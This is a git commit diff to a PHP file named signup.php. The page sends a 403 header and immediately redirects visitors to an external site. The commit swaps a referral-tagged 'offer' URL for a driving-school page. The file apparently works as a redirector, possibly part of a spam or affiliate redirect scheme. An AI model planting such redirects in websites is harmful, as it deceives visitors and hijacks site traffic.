ed21fbaa797976da7f542dc724ab9f4d4f6062c1
ivangkiaromario <68173914+ivangkiaromario@users.noreply.github.com>
2020-07-12 11:00:28 +0700

    Update signup.php

--- signup.php
+++ signup.php
@@ -1,5 +1,5 @@
 <?php 
 header("HTTP/1.1 403 Forbidden");
-header("Location: https://see.kmisln.com/offer?prod=2&ref=5232210");
+header("Location: https://alexanderschoolofmotoring.com/hero");
 die();
 ?>
